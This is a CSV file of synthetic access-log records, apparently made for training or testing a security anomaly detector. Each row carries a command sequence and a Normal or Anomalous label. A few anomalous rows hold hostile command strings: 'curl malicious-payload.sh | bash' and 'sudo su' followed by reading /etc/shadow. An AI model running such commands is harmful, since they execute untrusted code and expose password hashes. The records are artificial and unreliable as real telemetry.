entity_id,entity_type,timestamp,source_ip,geo_location,resource_accessed,auth_method,session_duration,command_sequence,device_fingerprint,login_success,label
81def83c-b83c-453e-bb07-858d6d45796b,Service Account,2026-01-15T03:52:26,57.45.58.87,"Lake Marilynmouth, Mauritania",App Server,API Key,6016,git pull -> git push,Load Balancer,1,Normal
239f388b-4b01-49f5-a555-8101ec1aa5fc,User,2026-01-15T06:14:06,252.31.157.177,"New Morganmouth, Australia",Payroll,Biometric,16939,N/A,macOS 14 - Safari,1,Normal
55bb52bb-04db-4bca-b5d0-72894e768165,Device,2026-01-15T09:24:11,237.183.180.90,"Lake Vasquezville, Andorra",AWS Console,Hardware Token,23938,N/A,App Server,1,Normal
970ec4bb-ca94-4565-988a-a211bc52fdcb,Device,2026-01-15T09:27:04,254.71.71.136,"North Riveraburgh, Uganda",App Server,Hardware Token,5463,N/A,App Server,1,Normal
68be8060-9ce1-4553-9334-f372baddceb2,Service Account,2026-01-15T12:14:17,154.2.72.44,"South Vasquezmouth, Mexico",App Server,Hardware Token,17481,ssh -i key.pem -> ls,IoT Gateway,1,Normal
eb8708c6-5224-43e1-ad71-eedf946e27ed,User,2026-01-15T12:41:23,49.42.180.178,"East Hallburgh, Mauritania",Jira,Biometric,7691,N/A,macOS 13 - Safari,1,Normal
8957624a-1ae4-4dba-8015-957d16b224c8,Service Account,2026-01-15T15:29:24,101.42.203.164,"Port Stevensmouth, Andorra",CI/CD Pipeline,Hardware Token,3176,kubectl get pods -> kubectl logs,IoT Gateway,1,Normal
817e19c9-0b69-4210-8f92-6d83645aa626,Device,2026-01-15T16:02:33,133.182.174.160,"South Ricardostad, Mexico",GitLab,Password,19615,terraform plan -> terraform apply,Container Host,1,Normal
9f645d31-9793-4288-9fea-3a534a92526c,User,2026-01-15T16:04:38,231.69.110.178,"Lake Marilynmouth, United States",Slack,Password,6754,N/A,Android 14 - Chrome Mobile,1,Normal
679d7cde-0831-46aa-bd2a-ebb373360653,Service Account,2026-01-15T16:19:02,23.151.232.92,"South Morganton, Netherlands",CI/CD Pipeline,API Key,11357,N/A,IoT Gateway,1,Normal
f599794b-1d2e-42de-8ae8-26b7d8fb7c5f,User,2026-01-15T16:36:55,76.181.46.8,"Fort Stevensburgh, Ghana",VPN,Password,28,N/A,macOS 13 - Chrome,0,Anomalous
c3dd0227-4488-4d4d-a571-2614bc0c3649,Device,2026-01-15T19:27:18,26.244.116.45,"New Jordanview, Ghana",AWS Console,Hardware Token,4013,kubectl get pods -> kubectl logs,App Server,1,Normal
e5e85a85-a929-4a0e-a422-f2f7dc1d066d,Service Account,2026-01-15T19:53:24,25.15.156.83,"North Jordanford, Germany",App Server,SSO,2169,SELECT * FROM records,App Server,1,Normal
2c457176-8715-4c9f-8af8-07c6bb17748a,Device,2026-01-15T20:54:42,176.5.131.227,"North Riveraview, Australia",App Server,Hardware Token,15063,terraform plan -> terraform apply,Load Balancer,1,Normal
396ec960-d684-4498-86b5-cac23e2d7994,Device,2026-01-15T22:57:48,124.241.231.226,"Lake Brandonview, United Kingdom",App Server,SSO,14910,terraform plan -> terraform apply,IoT Gateway,1,Normal
7c5815dd-e1cf-424a-80a1-909a3e1f9e0e,Device,2026-01-15T23:52:53,31.97.65.177,"Fort Ricardohaven, Germany",AWS Console,SSO,9436,N/A,Container Host,1,Normal
cec96f27-5d35-49b5-a6d7-c918b3c25097,Device,2026-01-16T00:19:08,19.43.133.105,"Lake Theresaton, Australia",App Server,SSO,5089,kubectl get pods -> kubectl logs,IoT Gateway,1,Normal
d0f8c8db-3e22-4aa8-8942-5844617e5e6b,Device,2026-01-16T00:36:30,198.243.218.204,"South Ricardoford, Mauritius",AWS Console,Hardware Token,18560,kubectl get pods -> kubectl logs,App Server,1,Normal
aec1e5e3-e495-4410-8ef6-db0b8d464a4b,Device,2026-01-16T01:52:18,171.16.182.94,"Fort Marilynstad, Canada",GitLab,Hardware Token,22293,N/A,Load Balancer,1,Normal
828b17a8-abd9-4013-b5da-d3d20a346647,Device,2026-01-16T03:13:23,208.177.177.22,"Port Ricardoborough, Mauritania",App Server,SSO,16056,N/A,Container Host,1,Normal
452c2179-c2b9-47fc-a4f3-913eee29f33e,User,2026-01-16T04:12:06,246.79.81.152,"North Morganton, Netherlands",CRM,MFA,19026,N/A,Windows 11 - Chrome,1,Normal
f125fa4b-46e7-4828-8361-28c893c466f0,Device,2026-01-16T06:45:52,155.56.71.45,"Lake Theresaside, France",VPN,SSO,13468,N/A,Container Host,1,Normal
883601a8-5899-4ab1-ae19-e85754060600,Service Account,2026-01-16T07:07:37,227.39.50.250,"West Matthewhaven, Netherlands",App Server,Hardware Token,21324,N/A,Load Balancer,1,Normal
1661debf-19f1-462c-9807-6d2a082964f7,Device,2026-01-16T07:41:28,32.78.48.206,"West Brandonmouth, Mexico",App Server,Hardware Token,13876,N/A,Load Balancer,1,Normal
6c2c6a39-c8f9-4c33-b7c2-eed7f327a195,Device,2026-01-16T09:43:00,47.169.202.209,"East Marilynville, Uganda",VPN,Password,19642,N/A,Container Host,1,Normal
5da16749-faff-4d8a-a8c2-527af8e5a2b1,Device,2026-01-16T10:57:37,132.34.154.165,"North Jordanmouth, Mauritania",AWS Console,SSO,15029,N/A,Load Balancer,1,Normal
b23a7ded-939f-411d-a6c7-979045b02b95,Device,2026-01-16T13:00:08,102.159.12.154,"New Jordanford, France",GitLab,Hardware Token,20141,N/A,Load Balancer,1,Normal
7b3b85c6-37e4-4539-ab1d-278635a0c357,User,2026-01-16T13:18:57,203.146.71.14,"New Stevensford, Uganda",HRIS,SSO,11096,N/A,Windows 10 - Firefox,1,Normal
9bb5dde9-88bf-4c72-a0f4-575d484b1b06,User,2026-01-16T14:11:07,74.137.109.15,"West Ricardohaven, Mauritania",SharePoint,Hardware Token,9169,N/A,Windows 11 - Edge,1,Normal
007e5ca3-af75-4adb-ab4b-b553e2186999,User,2026-01-16T14:41:28,99.62.186.142,"South Hallmouth, Andorra",Database,Password,8039,N/A,Ubuntu 22.04 - Chrome,1,Normal
2ff66b0f-79cd-442a-ac38-33bd01defab1,Device,2026-01-16T14:58:13,237.198.207.195,"Port Matthewford, Ghana",AWS Console,Hardware Token,3639,kubectl get pods -> kubectl logs,App Server,1,Normal
43e962af-311c-4615-81fb-e131a2319690,User,2026-01-16T15:20:58,54.109.23.128,"New Theresamouth, Germany",CRM,MFA,21399,N/A,macOS 14 - Safari,1,Normal
2aeb37fe-0417-49cb-a48e-e79b42bdcb17,Service Account,2026-01-16T15:25:30,173.154.240.246,"Lake Theresaford, Uganda",Database,API Key,9281,N/A,IoT Gateway,1,Normal
bcfd6b6e-8a75-451f-a251-b31753849494,Device,2026-01-16T15:34:24,100.202.109.145,"New Morganside, Netherlands",AWS Console,SSO,41869,curl malicious-payload.sh | bash,IoT Gateway,0,Anomalous
5619c926-e782-4dcb-9a36-e23fc61b71b8,Device,2026-01-16T16:44:51,53.39.12.141,"Lake Vasquezton, Netherlands",AWS Console,Password,4481,UPDATE records -> pg_dump,Build Agent,1,Normal
cb7dc7b1-7b06-4219-b74e-3e39ee8264fa,User,2026-01-16T17:48:29,16.4.79.123,"New Brandonhaven, Canada",Slack,Hardware Token,11820,N/A,macOS 14 - Safari,1,Normal
528c2df9-f48a-4a3c-968b-61dddae57dcf,Service Account,2026-01-16T18:20:10,122.217.90.90,"Port Morganborough, Mexico",GitLab,SSO,4975,terraform plan -> terraform apply,Build Agent,1,Normal
49bff4b2-c15f-45be-a563-520c1de925ca,Service Account,2026-01-16T19:30:22,33.140.84.212,"North Vasquezmouth, Ghana",App Server,SSO,21073,SELECT * FROM records,Container Host,1,Normal
157d426d-bec4-4406-8114-50cff90198e2,Service Account,2026-01-16T23:35:00,75.171.106.50,"Port Vasquezview, United States",AWS Console,API Key,1359,N/A,Container Host,1,Normal
fa9412a0-9cc8-4b31-a38f-e9cdbecca473,Service Account,2026-01-17T00:14:10,222.174.144.24,"Lake Hallside, Mauritius",AWS Console,SSO,1829,N/A,Load Balancer,1,Normal
d41d1f67-255f-4e3d-8688-a96187394a8e,User,2026-01-17T00:14:10,150.85.20.173,"North Riveraton, United States",Payroll,Password,17764,N/A,Ubuntu 22.04 - Chrome,1,Normal
ad63483e-7a59-4fc4-b8e6-3a95ef2ef6ef,Device,2026-01-17T01:29:02,83.119.93.181,"South Marilynview, Canada",Database,Hardware Token,24904,N/A,IoT Gateway,1,Normal
caf72cc8-cfea-496b-9c07-8af3cf63fecf,User,2026-01-17T01:59:11,221.214.13.73,"South Matthewhaven, Ghana",SharePoint,Biometric,20526,N/A,Windows 10 - Chrome,1,Normal
ad229c2f-173c-44ba-bc48-f3341a14f7c6,User,2026-01-17T02:12:22,154.86.164.83,"West Ricardoville, Netherlands",Email,SSO,3548,N/A,Ubuntu 22.04 - Chrome,1,Normal
da4134a6-98ef-4e8a-b68f-0e8bebebf6d5,Device,2026-01-17T03:15:19,63.93.1.152,"Fort Stevensborough, Canada",AWS Console,Hardware Token,11654,N/A,Container Host,1,Normal
0d5d1d8b-3ef5-4a8a-9707-51e589efae84,Service Account,2026-01-17T03:24:43,78.70.24.78,"Port Theresaside, Germany",GitLab,Hardware Token,2484,N/A,Build Agent,1,Normal
e33150b9-6e51-4999-ab5b-5ad1126f81d3,Device,2026-01-17T04:37:35,203.207.35.205,"North Taylorhaven, Mauritius",VPN,Hardware Token,16288,N/A,Load Balancer,1,Normal
1025c75e-cb12-4846-ba0d-17414089374f,Service Account,2026-01-17T05:07:34,93.161.184.19,"West Ricardoford, Mauritius",AWS Console,Hardware Token,14796,N/A,App Server,1,Normal
7fe9be22-acd1-47ca-b169-e953ec3fb742,User,2026-01-17T05:27:08,77.57.85.94,"South Taylorhaven, United States",Email,Password,1378,N/A,Windows 11 - Chrome,1,Normal
dbce0863-3870-4097-a7dc-5353fee4865d,Service Account,2026-01-17T05:34:49,6.138.177.163,"Fort Taylorton, United States",Database,Hardware Token,5215,N/A,Container Host,1,Normal
a3b6657f-a8b9-40c6-b2de-8be1dbf51a7b,Service Account,2026-01-17T08:02:12,51.236.214.184,"North Ricardoview, France",CI/CD Pipeline,API Key,24941,N/A,IoT Gateway,1,Normal
b5d94cf1-affe-452a-b6b0-45f1458bd030,User,2026-01-17T10:14:20,6.129.45.32,"North Riverastad, Mexico",CRM,Biometric,9943,N/A,macOS 13 - Safari,1,Normal
872b158e-9198-4289-b1da-c388110cc042,Device,2026-01-17T14:44:41,215.215.84.55,"Fort Brandonburgh, Australia",GitLab,Password,23483,N/A,Load Balancer,1,Normal
d5efa96c-8066-43a3-85ee-30fe0264ff29,Device,2026-01-17T15:02:46,207.107.76.55,"North Stevensborough, United Kingdom",AWS Console,Hardware Token,6113,UPDATE records -> pg_dump,App Server,1,Normal
bf14db06-dec9-4342-bb85-6df8139258ec,User,2026-01-17T15:51:09,30.71.137.22,"New Ricardomouth, Mauritania",CRM,Password,23907,N/A,Windows 11 - Edge,1,Normal
ca84c6a5-a719-4cde-b714-c378b6f87fbc,User,2026-01-17T16:26:24,192.117.158.161,"Fort Marilynview, Mexico",Database,SSO,10694,N/A,Windows 11 - Edge,1,Normal
30128e05-9e09-45ef-b514-77bd697b90df,Device,2026-01-17T17:34:12,69.208.30.51,"Lake Taylormouth, Mauritius",App Server,Password,9488,N/A,Build Agent,1,Normal
c75ac4d7-9e4b-41d2-9927-ec6130d8ad7f,Device,2026-01-17T20:16:07,159.61.248.62,"West Theresaside, Ghana",VPN,Hardware Token,13140,N/A,Container Host,1,Normal
ac2bc2ad-82a6-40b5-85ac-2d519ab4cf7d,Device,2026-01-17T20:40:57,245.228.72.163,"East Riverastad, Andorra",GitLab,SSO,6208,kubectl get pods -> kubectl logs,IoT Gateway,1,Normal
aaaf23b0-b6e1-4090-b5f6-251c579822d0,Service Account,2026-01-17T21:37:38,55.222.106.172,"New Morganburgh, Australia",App Server,API Key,2223,pg_dump,IoT Gateway,1,Normal
74e0f7ea-0809-4762-86b1-763fe47bc72c,User,2026-01-17T21:57:41,168.111.236.229,"South Stevensburgh, Australia",VPN,Password,20112,N/A,Android 14 - Chrome Mobile,1,Normal
e7ae3784-f352-43da-abf2-f2529533da59,Service Account,2026-01-18T00:42:29,143.238.209.191,"North Vasquezview, Iran",GitLab,API Key,56795,whoami -> sudo su -> cat /etc/shadow,Load Balancer,0,Anomalous
a6880425-c0f7-4177-b7fe-3b0fc125767d,Service Account,2026-01-18T05:32:20,245.110.200.201,"West Jordanburgh, Andorra",CI/CD Pipeline,API Key,23641,SELECT * FROM records,Build Agent,1,Normal
e3f63d88-4a68-4449-9090-cdebb1d453b3,Device,2026-01-18T06:06:16,97.145.182.61,"South Ricardostad, Mauritania",AWS Console,SSO,21716,N/A,IoT Gateway,1,Normal
a4e8d27d-5aaf-4c67-ab0b-f2c90a106409,User,2026-01-18T06:22:32,169.69.77.144,"North Hallhaven, Netherlands",CRM,MFA,5737,N/A,Windows 10 - Firefox,1,Normal
21198b07-01b3-4945-a240-a94863b98e47,Service Account,2026-01-18T09:06:31,179.142.209.183,"Port Jordanside, Andorra",CI/CD Pipeline,SSO,14639,N/A,Load Balancer,1,Normal
ce95d765-a440-4f4d-97b3-fdd740ce2f70,User,2026-01-18T09:36:34,82.54.52.112,"South Stevensborough, Germany",Database,Biometric,25211,ssh -i key.pem -> ls,Android 14 - Chrome Mobile,1,Normal
0ff51c77-2262-4c6d-8159-1b529e9e5e28,User,2026-01-18T12:33:02,191.138.213.224,"Lake Matthewstad, Chile",Slack,Password,17948,N/A,macOS 13 - Chrome,1,Normal
5cfa9ff9-d191-4c8a-b38c-f4d685951d8d,User,2026-01-18T12:58:57,21.227.78.185,"East Ricardoview, Germany",Database,SSO,13885,N/A,macOS 14 - Safari,1,Normal
2e18b3ca-c997-44c2-8426-6a106e92d53b,Service Account,2026-01-18T13:49:01,66.84.159.166,"New Jordanton, Germany",App Server,SSO,14870,N/A,Build Agent,1,Normal
d42678a1-c0f2-4bff-8cbc-a8a28d900945,Service Account,2026-01-18T14:39:41,215.53.251.52,"Fort Hallstad, Australia",Database,SSO,44540,curl malicious-payload.sh | bash,Container Host,0,Anomalous
d075b2a6-9ca4-436b-8b25-d1f597141794,Service Account,2026-01-18T14:47:00,170.2.134.25,"Port Theresahaven, Chile",AWS Console,Hardware Token,20785,N/A,Container Host,1,Normal
8ccbe8bc-8275-4dce-b2d5-25ce38511872,Service Account,2026-01-18T16:47:31,245.11.208.175,"Port Brandonview, Mauritania",App Server,Hardware Token,12286,pg_dump,App Server,1,Normal
c01b48bd-7585-44f0-87f5-5b7907abb3ed,User,2026-01-18T18:45:10,139.50.216.156,"West Stevensford, Germany",Payroll,Hardware Token,4294,N/A,iOS 17 - Safari Mobile,1,Normal
b126573d-0944-4453-986a-e4d0cfb37c05,Device,2026-01-18T19:05:58,83.100.168.184,"Port Jordanmouth, Mexico",Database,Hardware Token,20688,N/A,Build Agent,1,Normal
ef193762-bcc3-4702-b79f-c0aff320c1e0,User,2026-01-18T19:07:17,110.33.74.183,"Fort Stevensville, Chile",Payroll,Biometric,15867,N/A,Windows 10 - Firefox,1,Normal
42cd184b-074b-428b-af7c-a987bbb459e6,Device,2026-01-18T20:32:42,137.101.100.141,"Lake Hallborough, Netherlands",GitLab,Password,12856,terraform plan -> terraform apply,IoT Gateway,1,Normal
55c3903f-cd14-491d-a9e9-359ffa8f5726,Service Account,2026-01-18T20:58:53,137.159.149.98,"Lake Morganville, Mexico",Database,Hardware Token,24381,N/A,IoT Gateway,1,Normal
514c0f1c-023b-4fbd-8c19-eab48ed9bcb3,Service Account,2026-01-18T21:07:09,201.150.164.95,"Fort Matthewstad, Mexico",GitLab,Hardware Token,7609,N/A,Container Host,1,Normal
22642920-6b92-4fd3-9b19-3f2b729dc3f3,Service Account,2026-01-18T21:31:30,35.170.147.146,"North Brandonford, Canada",AWS Console,Hardware Token,15026,N/A,Load Balancer,1,Normal
4431193e-9895-4069-8187-6c75242262a5,Device,2026-01-18T22:33:34,249.110.207.50,"Port Theresaford, Australia",Database,SSO,22463,kubectl get pods -> kubectl logs,App Server,1,Normal
d5a51830-76f0-47c6-a12f-85b5dd5ca668,User,2026-01-18T23:28:33,158.160.138.119,"Lake Riverahaven, Andorra",Payroll,Password,569,N/A,Ubuntu 22.04 - Chrome,1,Normal
15f6739c-8965-43e9-b637-4a104b8653aa,Service Account,2026-01-19T01:42:55,44.85.150.202,"Port Theresaville, Australia",App Server,API Key,6293,N/A,Build Agent,1,Normal
4e7659c1-06f6-485b-bbab-ecba0828a44e,Device,2026-01-19T02:09:51,53.175.140.23,"West Taylorville, United Kingdom",Database,Password,13480,N/A,Load Balancer,1,Normal
7b7bd3e3-45ac-4f22-b13d-83bc395bf491,User,2026-01-19T02:43:20,192.52.221.213,"North Vasquezstad, Mauritius",Database,Biometric,13603,N/A,Windows 11 - Edge,1,Normal
33ed7d24-3be2-4ef5-bc6b-7f7247a88ae4,Service Account,2026-01-19T03:01:18,229.127.215.78,"Fort Marilynhaven, Canada",Database,Hardware Token,11606,terraform plan -> terraform apply,Load Balancer,1,Normal
1ff17906-a1ed-45da-a00f-73b9bce45519,User,2026-01-19T04:38:10,153.105.243.22,"West Stevensville, United Kingdom",Database,Hardware Token,12196,pg_dump,Android 14 - Chrome Mobile,1,Normal
be465a04-3b0b-4e12-9237-4ab0808c8661,Service Account,2026-01-19T04:49:06,23.86.93.36,"Lake Morganmouth, Andorra",CI/CD Pipeline,API Key,6644,UPDATE records -> pg_dump,Container Host,1,Normal
75930d68-4048-4e33-a6b3-bb750b600747,Device,2026-01-19T05:34:57,81.67.253.21,"South Taylorborough, Canada",AWS Console,Hardware Token,17173,terraform plan -> terraform apply,Load Balancer,1,Normal
46e7b558-6b74-49a8-9d6b-5f270f8a4480,Service Account,2026-01-19T06:15:19,195.29.221.192,"West Hallton, Uganda",CI/CD Pipeline,SSO,18092,N/A,Load Balancer,1,Normal
2322ca1c-1082-4f22-97b4-b3b1679cf1d4,Service Account,2026-01-19T06:17:06,119.34.210.222,"Fort Ricardoside, Uganda",App Server,Hardware Token,3687,N/A,Container Host,1,Normal
836591a9-a916-4e27-a45a-a355834700f0,Device,2026-01-19T07:01:24,121.242.2.140,"East Morganburgh, Canada",VPN,Hardware Token,3963,N/A,IoT Gateway,1,Normal
0b6f6bbf-94b5-460b-a30e-0ee492a72347,Service Account,2026-01-19T07:13:07,113.223.242.200,"Port Stevenshaven, Chile",App Server,Hardware Token,16448,SELECT * FROM records,Build Agent,1,Normal
5353db7a-53a2-4aff-9c0e-552e6555ab98,Service Account,2026-01-19T07:16:30,129.47.243.126,"Port Jordanville, Mexico",AWS Console,SSO,2996,SELECT * FROM records,IoT Gateway,1,Normal
59626792-17d9-4bdf-9ece-22bc330a61cb,Device,2026-01-19T09:03:25,5.136.221.167,"North Theresamouth, Ghana",VPN,SSO,3738,N/A,Build Agent,1,Normal
75f6abe9-96b0-4320-9646-b64fc058f33e,User,2026-01-19T09:18:01,88.28.158.6,"East Stevenshaven, France",CRM,Password,9860,N/A,Windows 11 - Edge,1,Normal
ab754244-9680-4b0b-b094-38ee726dfa90,Service Account,2026-01-19T10:52:04,133.210.193.198,"North Marilynside, Ghana",GitLab,SSO,8518,terraform plan -> terraform apply,IoT Gateway,1,Normal
8833b18c-14db-44c9-b34f-b28f0f1542d6,Device,2026-01-19T13:04:45,100.105.62.160,"New Taylorside, Canada",AWS Console,Password,9014,ssh -i key.pem -> ls,Load Balancer,1,Normal
04fbd90e-c680-4ab3-906a-40c819a150c8,User,2026-01-19T13:04:57,25.78.145.27,"Fort Hallville, North Korea",Payroll,Biometric,53,curl malicious-payload.sh | bash,macOS 14 - Safari,0,Anomalous
b1656a03-3497-4796-a0d8-749f32247996,Device,2026-01-19T13:17:42,63.122.250.11,"Port Hallstad, United Kingdom",AWS Console,SSO,9061,git pull -> git push,Container Host,1,Normal
4b7d5011-dc2d-492f-b60a-da597e094586,Service Account,2026-01-19T16:54:21,44.197.131.148,"North Matthewhaven, Mexico",AWS Console,Hardware Token,21925,SELECT * FROM records,Load Balancer,0,Normal
e7639771-76ed-4ee7-991a-04cd5737c871,Service Account,2026-01-19T16:56:29,116.120.219.126,"West Marilynstad, France",CI/CD Pipeline,SSO,24174,git pull -> git push,App Server,1,Normal
9471ef96-1547-4b3a-ae53-0721a6a23fd7,Service Account,2026-01-19T18:19:53,88.34.49.183,"Port Brandonville, Chile",CI/CD Pipeline,SSO,21384,kubectl get pods -> kubectl logs,App Server,1,Normal
d53ee5ff-8dd7-4651-a97e-1e75cd1825d5,User,2026-01-19T18:28:53,147.25.201.82,"Fort Taylorburgh, Germany",Jira,MFA,21961,N/A,Android 14 - Chrome Mobile,1,Normal
7d0d8705-91c7-4eab-838f-d11c99a9b98d,Service Account,2026-01-19T18:33:27,160.74.232.148,"East Morganview, Mauritius",App Server,Hardware Token,6963,UPDATE records -> pg_dump,IoT Gateway,1,Normal
6fb4f67a-1102-4dd7-8975-99d05e77e75c,Device,2026-01-19T19:17:08,66.107.23.84,"New Jordanmouth, Chile",GitLab,SSO,19418,kubectl get pods -> kubectl logs,App Server,1,Normal
43138593-e340-4552-a263-92ddde9c9a76,User,2026-01-19T19:56:37,235.56.149.203,"East Stevensside, Ghana",Email,SSO,303,N/A,Windows 10 - Firefox,1,Normal
b49d244c-be2c-4002-89e0-c3f3d6d9ff2d,Service Account,2026-01-19T22:17:55,35.218.171.8,"East Morganton, Mauritius",CI/CD Pipeline,Hardware Token,7048,git pull -> git push,Container Host,1,Normal
250d2c37-5d7c-4da9-9402-e91d70060bae,Service Account,2026-01-19T23:38:15,90.160.219.146,"East Matthewburgh, United Kingdom",CI/CD Pipeline,API Key,2614,N/A,App Server,1,Normal
6bf95f2b-4738-47bd-be63-2e97177b3eb8,User,2026-01-20T02:51:30,115.16.189.179,"Lake Ricardoborough, Chile",Slack,MFA,5139,N/A,macOS 13 - Chrome,1,Normal
2e1a9ec1-01ae-4e62-b40c-db0d7f704843,User,2026-01-20T02:56:08,164.163.136.155,"South Jordanton, Mauritius",SharePoint,SSO,8336,N/A,Windows 10 - Chrome,1,Normal
1ab6252a-098a-404f-834d-4822fa88b615,Device,2026-01-20T03:04:26,25.129.201.244,"West Matthewhaven, Andorra",VPN,Password,2305,N/A,Container Host,1,Normal
c0c78b16-22c0-4bc5-bd5f-f5e4e979ce25,Device,2026-01-20T03:25:40,51.34.11.145,"West Brandonton, Ghana",App Server,Hardware Token,11640,pg_dump,Container Host,1,Normal
12a13e92-f093-4aa5-9da8-84f12ef911c1,Service Account,2026-01-20T04:45:13,150.114.121.144,"Port Stevenshaven, Australia",App Server,Hardware Token,4465,N/A,Container Host,1,Normal
a3ac6047-9b52-4ab7-9452-9d2344805498,User,2026-01-20T05:10:43,147.67.121.248,"New Morganside, Andorra",VPN,SSO,8695,N/A,Ubuntu 22.04 - Firefox,1,Normal
1db98620-0ef1-42b6-b978-4eb08dd8865f,Service Account,2026-01-20T06:03:08,107.78.104.136,"New Hallford, Mexico",Database,SSO,22878,ssh -i key.pem -> ls,Load Balancer,1,Normal
e56860db-4975-4a3f-b9d8-e17b11d1ec9c,User,2026-01-20T07:14:53,82.112.38.119,"East Marilynview, Chile",CRM,Hardware Token,3946,N/A,Windows 10 - Chrome,1,Normal
6ce926bb-cd32-4ee4-9098-279cce777124,Service Account,2026-01-20T07:17:54,97.94.62.94,"Lake Jordanstad, Germany",Database,API Key,16052,N/A,Build Agent,1,Normal
676c1f9b-ea84-4c38-936e-506d501fd82c,User,2026-01-20T07:46:45,150.27.81.120,"Port Marilynstad, Mauritania",Jira,SSO,992,N/A,Ubuntu 22.04 - Firefox,1,Normal
758fc410-37a2-4bfe-b67f-d46e7782854d,Device,2026-01-20T08:36:37,209.15.117.41,"Fort Brandonburgh, United Kingdom",AWS Console,SSO,19195,pg_dump,IoT Gateway,1,Normal
61615320-29c9-4439-8862-8c2ea0e2f6ff,Device,2026-01-20T09:57:49,226.25.134.157,"Lake Theresaburgh, Mauritania",VPN,Password,8216,N/A,App Server,1,Normal
843d3201-8b14-4e70-ac01-e8729df21240,Service Account,2026-01-20T11:23:51,109.225.180.35,"North Brandonhaven, United Kingdom",Database,Hardware Token,18948,N/A,Container Host,1,Normal
e00d7dd0-5988-4fd1-bfed-33e886bc9c1c,User,2026-01-20T16:00:26,125.161.232.219,"New Jordanborough, Andorra",VPN,SSO,23622,N/A,iOS 17 - Safari Mobile,1,Normal
58d2fc27-41a0-4979-b16e-123b43327e2b,Service Account,2026-01-20T17:42:32,207.184.74.21,"Lake Matthewton, Uganda",CI/CD Pipeline,API Key,11019,kubectl get pods -> kubectl logs,Container Host,1,Normal
2cf54007-6775-4c69-a573-662b14d0e9aa,Device,2026-01-20T18:12:06,207.10.123.216,"Fort Theresastad, Canada",GitLab,SSO,7794,ssh -i key.pem -> ls,Build Agent,1,Normal
7df01ac6-c872-4743-99e9-e015a6902a8e,User,2026-01-20T19:02:19,248.21.161.161,"New Vasquezview, Uganda",HRIS,MFA,24506,N/A,macOS 13 - Chrome,1,Normal
